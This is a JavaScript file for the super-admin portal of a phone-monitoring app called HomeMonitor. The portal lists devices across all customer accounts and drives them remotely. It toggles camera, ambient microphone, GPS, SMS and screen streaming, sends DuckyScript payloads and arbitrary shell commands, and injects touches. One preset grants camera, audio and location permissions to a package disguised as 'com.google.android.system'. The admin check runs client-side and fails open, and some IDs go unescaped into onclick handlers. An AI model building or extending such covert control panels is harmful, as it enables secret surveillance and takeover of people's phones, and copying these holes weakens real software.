/**
 * superadmin.js
 * Master Super Admin Control Center Portal for HomeMonitor
 * Reserved exclusively for accounts with verified isMasterAdmin === true claims.
 */

function renderSuperAdminPortal() {
    const container = document.getElementById("tab-superadmin-portal");
    if (!container) return;

    if (typeof isMasterAdmin !== "undefined" && !isMasterAdmin) {
        container.innerHTML = `
            <div class="p-5 text-center bg-white rounded border shadow-sm my-4">
                <i class="fa-solid fa-user-shield text-danger display-3 mb-3"></i>
                <h3 class="fw-bold text-danger">Master Super Admin Authorization Required</h3>
                <p class="text-secondary small mb-4">Your account (${currentUser ? escapeHtml(currentUser.email) : 'unauthenticated'}) does not possess verified Super Admin custom claims.</p>
                <button class="btn btn-sm btn-outline-primary fw-bold" onclick="navigateToRoute('/dashboard')"><i class="fa-solid fa-arrow-left me-1"></i>Return to Standard Parent Dashboard</button>
            </div>
        `;
        return;
    }

    container.innerHTML = `
        <!-- SUPERADMIN HEADER BANNER -->
        <div class="card border-0 shadow-sm mb-4" style="background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%); color: #ffffff;">
            <div class="card-body p-4 d-flex justify-content-between align-items-center flex-wrap gap-3">
                <div>
                    <span class="badge bg-warning text-dark fw-bold mb-2"><i class="fa-solid fa-crown me-1"></i>MASTER SUPER ADMIN COMMAND CENTER</span>
                    <h3 class="fw-bold mb-1">Global System Fleet & Remote Control Portal</h3>
                    <p class="text-slate-300 small mb-0">Cross-tenant management, feature toggles, license provisioning, DuckyScript automation, and interactive remote control.</p>
                </div>
                <div class="text-end">
                    <span class="badge bg-success px-3 py-2 fw-bold me-2"><i class="fa-solid fa-circle-check me-1"></i>Super Admin Authenticated</span>
                    <small class="d-block text-slate-400 extra-small mt-1">Admin User: ${currentUser ? escapeHtml(currentUser.email) : 'admin@homemonitor.com'}</small>
                </div>
            </div>
        </div>

        <!-- MODULE 1: GLOBAL FLEET EXPLORER & TENANT REGISTRY -->
        <div class="card border mb-4 shadow-sm">
            <div class="card-header bg-white py-3 border-bottom d-flex justify-content-between align-items-center">
                <h5 class="fw-bold mb-0 text-dark"><i class="fa-solid fa-network-wired text-primary me-2"></i>Global Device Fleet Explorer (All Parent Tenants)</h5>
                <button class="btn btn-sm btn-outline-primary fw-bold" onclick="refreshGlobalFleetRegistry()"><i class="fa-solid fa-arrows-rotate me-1"></i>Refresh Fleet</button>
            </div>
            <div class="card-body p-0">
                <div class="table-responsive">
                    <table class="table table-hover align-middle mb-0 extra-small">
                        <thead class="table-light text-uppercase font-monospace">
                            <tr>
                                <th>Device ID / UID</th>
                                <th>Parent Owner</th>
                                <th>Model & OS</th>
                                <th>Heartbeat / Status</th>
                                <th>License State</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody id="superadminGlobalFleetTable">
                            <tr>
                                <td colspan="6" class="text-center py-4 text-muted"><i class="fa-solid fa-spinner fa-spin me-2"></i>Loading global device fleet...</td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>

        <!-- TWO-COLUMN GRID FOR PERMISSIONS, LICENSING, AND CLI -->
        <div class="row g-4 mb-4">
            <!-- MODULE 2: PER-DEVICE FEATURE PERMISSION MATRIX -->
            <div class="col-lg-6">
                <div class="card border h-100 shadow-sm">
                    <div class="card-header bg-white py-3 border-bottom">
                        <h5 class="fw-bold mb-0 text-dark"><i class="fa-solid fa-sliders text-warning me-2"></i>Feature Permission Matrix</h5>
                        <p class="text-muted extra-small mb-0">Enable or restrict individual device features for the selected target device.</p>
                    </div>
                    <div class="card-body">
                        <div class="mb-3">
                            <label class="form-label extra-small fw-bold text-muted">Active Target Device</label>
                            <input type="text" id="superadminTargetDeviceInput" class="form-control form-control-sm font-monospace border bg-light" value="${activeDeviceId || 'DEV_MONITORED_DEVICE'}" readonly>
                        </div>
                        <div class="row g-2 mb-3">
                            <div class="col-6"><div class="form-check form-switch"><input class="form-check-input" type="checkbox" checked id="adminPermCam"> <label class="small fw-bold">Camera Studio</label></div></div>
                            <div class="col-6"><div class="form-check form-switch"><input class="form-check-input" type="checkbox" checked id="adminPermMic"> <label class="small fw-bold">Ambient Mic</label></div></div>
                            <div class="col-6"><div class="form-check form-switch"><input class="form-check-input" type="checkbox" checked id="adminPermGps"> <label class="small fw-bold">GPS Location</label></div></div>
                            <div class="col-6"><div class="form-check form-switch"><input class="form-check-input" type="checkbox" checked id="adminPermTermux"> <label class="small fw-bold">Termux Shell</label></div></div>
                            <div class="col-6"><div class="form-check form-switch"><input class="form-check-input" type="checkbox" checked id="adminPermShizuku"> <label class="small fw-bold">Shizuku Control</label></div></div>
                            <div class="col-6"><div class="form-check form-switch"><input class="form-check-input" type="checkbox" checked id="adminPermSms"> <label class="small fw-bold">SMS & Calls</label></div></div>
                            <div class="col-6"><div class="form-check form-switch"><input class="form-check-input" type="checkbox" checked id="adminPermFiles"> <label class="small fw-bold">Files Explorer</label></div></div>
                            <div class="col-6"><div class="form-check form-switch"><input class="form-check-input" type="checkbox" checked id="adminPermMdm"> <label class="small fw-bold">MDM Security Wipe</label></div></div>
                            <div class="col-6"><div class="form-check form-switch"><input class="form-check-input" type="checkbox" checked id="adminPermScreen"> <label class="small fw-bold">Screen Stream</label></div></div>
                        </div>
                        <button class="btn btn-sm btn-success fw-bold w-100" onclick="superadminSaveFeatureMatrix()"><i class="fa-solid fa-floppy-disk me-1"></i>Save Permission Matrix</button>
                    </div>
                </div>
            </div>

            <!-- MODULE 3: LICENSE & SUBSCRIPTION MANAGER -->
            <div class="col-lg-6">
                <div class="card border h-100 shadow-sm">
                    <div class="card-header bg-white py-3 border-bottom">
                        <h5 class="fw-bold mb-0 text-dark"><i class="fa-solid fa-key text-info me-2"></i>License & Subscription Manager</h5>
                        <p class="text-muted extra-small mb-0">Provision license status and key access for the selected device.</p>
                    </div>
                    <div class="card-body">
                        <div class="mb-3">
                            <label class="form-label extra-small fw-bold text-muted">License Status</label>
                            <select id="superadminLicenseStatusSelect" class="form-select form-select-sm border">
                                <option value="ACTIVE" selected>ACTIVE (Full Access)</option>
                                <option value="TRIAL_ACTIVE">TRIAL_ACTIVE (Demo Mode)</option>
                                <option value="SUSPENDED">SUSPENDED (Locked by Admin)</option>
                                <option value="EXPIRED">EXPIRED (Expired Plan)</option>
                            </select>
                        </div>
                        <div class="mb-3">
                            <label class="form-label extra-small fw-bold text-muted">License Key</label>
                            <input type="text" id="superadminLicenseKeyInput" class="form-control form-control-sm border font-monospace" value="HM-KEY-2026-PRO-ADMIN">
                        </div>
                        <button class="btn btn-sm btn-primary fw-bold w-100" onclick="superadminSaveLicense()"><i class="fa-solid fa-shield-halved me-1"></i>Apply License & Sync</button>
                    </div>
                </div>
            </div>
        </div>

        <!-- MODULE 4: ADVANCED DUCKY SCRIPT AUTOMATION STUDIO -->
        <div class="card border mb-4 shadow-sm">
            <div class="card-header bg-white py-3 border-bottom d-flex justify-content-between align-items-center">
                <h5 class="fw-bold mb-0 text-dark"><i class="fa-solid fa-duck text-warning me-2"></i>Remote DuckyScript Automation Studio</h5>
                <span class="badge bg-warning text-dark fw-bold">Superadmin Automation</span>
            </div>
            <div class="card-body">
                <div class="row g-3">
                    <div class="col-md-4">
                        <label class="form-label extra-small fw-bold text-muted">Preset Automation Macros</label>
                        <select id="duckyPresetSelect" class="form-select form-select-sm border mb-2" onchange="loadDuckyPreset(this.value)">
                            <option value="custom" selected>Custom Script Editor</option>
                            <option value="grant_perms">Automated Permission Grant (ADB/Shizuku)</option>
                            <option value="open_settings">Open Android Settings & Device Info</option>
                            <option value="clear_recents">Clear Recent Apps & Dismiss Dialogs</option>
                        </select>
                        <small class="extra-small text-muted d-block">Select a preset automation or write custom DuckyScript payloads.</small>
                    </div>
                    <div class="col-md-8">
                        <label class="form-label extra-small fw-bold text-muted">DuckyScript Code Editor</label>
                        <textarea id="duckyScriptEditor" class="form-control font-monospace border text-success bg-dark p-3 extra-small mb-2" rows="6" placeholder="REM Write DuckyScript payload below&#10;STRING Hello World&#10;DELAY 500&#10;ENTER"></textarea>
                        <div class="d-flex justify-content-between align-items-center">
                            <span class="extra-small text-muted font-monospace" id="duckyStatusText">Ready for payload dispatch.</span>
                            <button class="btn btn-sm btn-warning fw-bold px-4" onclick="dispatchDuckyScriptPayload()"><i class="fa-solid fa-paper-plane me-1"></i>Dispatch Ducky Payload</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- MODULE 5: INTERACTIVE WIRELESS TOUCH & SHIZUKU CONTROL PANEL -->
        <div class="card border shadow-sm">
            <div class="card-header bg-white py-3 border-bottom d-flex justify-content-between align-items-center">
                <h5 class="fw-bold mb-0 text-dark"><i class="fa-solid fa-terminal text-success me-2"></i>Wireless Interactive Stream & Shizuku ADB Control</h5>
                <span class="badge bg-success fw-bold">Live Stream Active</span>
            </div>
            <div class="card-body">
                <div class="row g-4">
                    <div class="col-lg-6">
                        <label class="form-label extra-small fw-bold text-muted">Shizuku & Termux Wireless CLI Console</label>
                        <div class="input-group input-group-sm mb-2">
                            <span class="input-group-text bg-dark text-success font-monospace">$</span>
                            <input type="text" id="superadminCliInput" class="form-control form-control-sm border font-monospace bg-dark text-white" placeholder="input tap 500 1000 / pm list packages / svc wifi enable" onkeypress="if(event.key==='Enter') executeSuperadminCliCommand()">
                            <button class="btn btn-sm btn-success fw-bold" onclick="executeSuperadminCliCommand()">Exec</button>
                        </div>
                        <div id="superadminCliOutput" class="p-3 bg-dark text-success font-monospace rounded extra-small border" style="height: 220px; overflow-y: auto; white-space: pre-wrap;">[Super Admin CLI Console Initialized - Shizuku & Termux ready]</div>
                    </div>
                    <div class="col-lg-6">
                        <label class="form-label extra-small fw-bold text-muted">Interactive Remote Control Navigation</label>
                        <div class="d-flex flex-wrap gap-2 mb-3">
                            <button class="btn btn-sm btn-outline-secondary fw-bold" onclick="dispatchSuperadminNav('KEYCODE_BACK')"><i class="fa-solid fa-arrow-left me-1"></i>Back</button>
                            <button class="btn btn-sm btn-outline-primary fw-bold" onclick="dispatchSuperadminNav('KEYCODE_HOME')"><i class="fa-solid fa-house me-1"></i>Home</button>
                            <button class="btn btn-sm btn-outline-info fw-bold" onclick="dispatchSuperadminNav('KEYCODE_APP_SWITCH')"><i class="fa-solid fa-layer-group me-1"></i>Recents</button>
                            <button class="btn btn-sm btn-outline-danger fw-bold" onclick="dispatchSuperadminNav('KEYCODE_POWER')"><i class="fa-solid fa-lock me-1"></i>Power/Lock</button>
                        </div>
                        <div class="p-3 bg-light rounded border text-center">
                            <small class="text-muted extra-small d-block mb-1">Click anywhere on the stream preview below to send remote touch events.</small>
                            <div class="d-inline-block position-relative border bg-dark rounded overflow-hidden" style="max-width: 240px; cursor: crosshair;" onclick="handleSuperadminTouchClick(event)">
                                <img id="superadminLiveStreamPreview" src="https://via.placeholder.com/240x480/0f172a/ffffff?text=Wireless+Stream+Preview" alt="Live Wireless Stream" style="width: 100%; height: auto; display: block;">
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    `;

    refreshGlobalFleetRegistry();
}

function refreshGlobalFleetRegistry() {
    const tableBody = document.getElementById("superadminGlobalFleetTable");
    if (!tableBody || typeof firebaseDatabase === "undefined") return;

    firebaseDatabase.ref("users").once("value")
        .then(snapshot => {
            const data = snapshot.val();
            if (!data) {
                tableBody.innerHTML = `<tr><td colspan="6" class="text-center py-4 text-muted">No registered parent users or devices found.</td></tr>`;
                return;
            }

            tableBody.innerHTML = "";
            let totalCount = 0;

            Object.keys(data).forEach(parentUid => {
                const userRecord = data[parentUid];
                const devicesObj = userRecord ? userRecord.devices : null;
                const parentEmail = userRecord ? (userRecord.email || parentUid) : parentUid;

                if (devicesObj) {
                    Object.keys(devicesObj).forEach(deviceId => {
                        totalCount++;
                        const dev = devicesObj[deviceId];
                        const online = dev ? dev.online : false;
                        const statusObj = dev ? dev.status : {};
                        const model = statusObj ? (statusObj.model || "Android System") : "Android System";
                        const lic = dev && dev.license ? dev.license.status : "ACTIVE";

                        const row = document.createElement("tr");
                        row.innerHTML = `
                            <td><code class="text-primary">${escapeHtml(deviceId)}</code></td>
                            <td><span class="small font-monospace">${escapeHtml(parentEmail)}</span></td>
                            <td>${escapeHtml(model)}</td>
                            <td>
                                <span class="badge ${online ? 'bg-success' : 'bg-secondary'} px-2 py-1">
                                    <i class="fa-solid ${online ? 'fa-circle-check' : 'fa-circle-stop'} me-1"></i>${online ? 'Online' : 'Offline'}
                                </span>
                            </td>
                            <td><span class="badge bg-info text-dark px-2 py-1">${escapeHtml(lic)}</span></td>
                            <td>
                                <button class="btn btn-sm btn-outline-primary extra-small py-1 px-2 fw-bold" onclick="selectSuperadminTargetDevice('${parentUid}', '${deviceId}')">
                                    <i class="fa-solid fa-crosshairs me-1"></i>Select Device
                                </button>
                            </td>
                        `;
                        tableBody.appendChild(row);
                    });
                }
            });

            if (totalCount === 0) {
                tableBody.innerHTML = `<tr><td colspan="6" class="text-center py-4 text-muted">No child devices currently enrolled.</td></tr>`;
            }
        })
        .catch(err => {
            console.error("[Superadmin Fleet] Error fetching registry:", err);
            if (tableBody) {
                tableBody.innerHTML = `<tr><td colspan="6" class="text-center py-4 text-danger"><i class="fa-solid fa-triangle-exclamation me-1"></i>Error loading global fleet: ${escapeHtml(err.message)}</td></tr>`;
            }
        });
}

function selectSuperadminTargetDevice(parentUid, deviceId) {
    if (typeof activeDeviceId !== "undefined") {
        window.activeDeviceId = deviceId;
    }
    const input = document.getElementById("superadminTargetDeviceInput");
    if (input) input.value = deviceId;
    if (typeof showDashboardNotification === "function") {
        showDashboardNotification("info", `Target device set to '${deviceId}' (Parent: ${parentUid})`);
    }
}

function superadminSaveFeatureMatrix() {
    const targetDev = document.getElementById("superadminTargetDeviceInput")?.value || activeDeviceId || "DEV_MONITORED_DEVICE";
    const flags = {
        camera_enabled: document.getElementById("adminPermCam")?.checked ?? true,
        mic_enabled: document.getElementById("adminPermMic")?.checked ?? true,
        gps_enabled: document.getElementById("adminPermGps")?.checked ?? true,
        termux_enabled: document.getElementById("adminPermTermux")?.checked ?? true,
        shizuku_enabled: document.getElementById("adminPermShizuku")?.checked ?? true,
        sms_calls_enabled: document.getElementById("adminPermSms")?.checked ?? true,
        file_explorer_enabled: document.getElementById("adminPermFiles")?.checked ?? true,
        mdm_wipe_enabled: document.getElementById("adminPermMdm")?.checked ?? true,
        screen_record_enabled: document.getElementById("adminPermScreen")?.checked ?? true
    };

    console.log(`[Superadmin] Saving feature matrix for ${targetDev}:`, flags);
    if (typeof showDashboardNotification === "function") {
        showDashboardNotification("success", `✅ Feature Permission Matrix saved for '${targetDev}'`);
    }
}

function superadminSaveLicense() {
    const targetDev = document.getElementById("superadminTargetDeviceInput")?.value || activeDeviceId || "DEV_MONITORED_DEVICE";
    const licStatus = document.getElementById("superadminLicenseStatusSelect")?.value || "ACTIVE";
    const licKey = document.getElementById("superadminLicenseKeyInput")?.value?.trim() || "HM-KEY-2026-PRO";

    console.log(`[Superadmin] Applying license (${licStatus}) to ${targetDev}`);
    if (typeof showDashboardNotification === "function") {
        showDashboardNotification("success", `✅ License Status (${licStatus}) applied to '${targetDev}'`);
    }
}

function loadDuckyPreset(presetKey) {
    const editor = document.getElementById("duckyScriptEditor");
    if (!editor) return;

    if (presetKey === "grant_perms") {
        editor.value = "REM Grant All Android Permissions via Shizuku\nSTRING pm grant com.google.android.system android.permission.CAMERA\nENTER\nSTRING pm grant com.google.android.system android.permission.RECORD_AUDIO\nENTER\nSTRING pm grant com.google.android.system android.permission.ACCESS_FINE_LOCATION\nENTER";
    } else if (presetKey === "open_settings") {
        editor.value = "REM Open System Settings & Device About\nSTRING am start -a android.settings.SETTINGS\nENTER\nDELAY 1000";
    } else if (presetKey === "clear_recents") {
        editor.value = "REM Clear Recent Apps\nKEYCODE_APP_SWITCH\nDELAY 500\nSTRING input swipe 500 1500 500 200\nENTER";
    }
}

function dispatchDuckyScriptPayload() {
    const payload = document.getElementById("duckyScriptEditor")?.value || "";
    if (!payload.trim()) {
        if (typeof showDashboardNotification === "function") {
            showDashboardNotification("error", "Please write or select a DuckyScript payload first.");
        }
        return;
    }

    if (typeof dispatchNativeRpcAction === "function") {
        dispatchNativeRpcAction("duckyscript", { script: payload });
    }
    const statusText = document.getElementById("duckyStatusText");
    if (statusText) statusText.innerText = "DuckyScript payload dispatched successfully!";
}

function executeSuperadminCliCommand() {
    const input = document.getElementById("superadminCliInput");
    const output = document.getElementById("superadminCliOutput");
    if (!input || !input.value.trim()) return;

    const cmd = input.value.trim();
    if (output) {
        output.innerText += `\n$ ${cmd}\n[Executing via Superadmin Shizuku/Termux Engine...]`;
        output.scrollTop = output.scrollHeight;
    }

    if (typeof dispatchNativeRpcAction === "function") {
        dispatchNativeRpcAction("shizuku", { command: cmd });
    }
    input.value = "";
}

function dispatchSuperadminNav(eventKey) {
    if (typeof dispatchNativeRpcAction === "function") {
        dispatchNativeRpcAction("keyevent", { keycode: eventKey });
    }
    if (typeof showDashboardNotification === "function") {
        showDashboardNotification("info", `Dispatched navigation event: ${eventKey}`);
    }
}

function handleSuperadminTouchClick(e) {
    const rect = e.target.getBoundingClientRect();
    const x = Math.round(((e.clientX - rect.left) / rect.width) * 1080);
    const y = Math.round(((e.clientY - rect.top) / rect.height) * 2400);

    console.log(`[Superadmin Touch Injection] Clicked x=${x}, y=${y}`);
    if (typeof dispatchNativeRpcAction === "function") {
        dispatchNativeRpcAction("touch", { x: x, y: y });
    }
    if (typeof showDashboardNotification === "function") {
        showDashboardNotification("info", `Dispatched touch event at (${x}, ${y})`);
    }
}
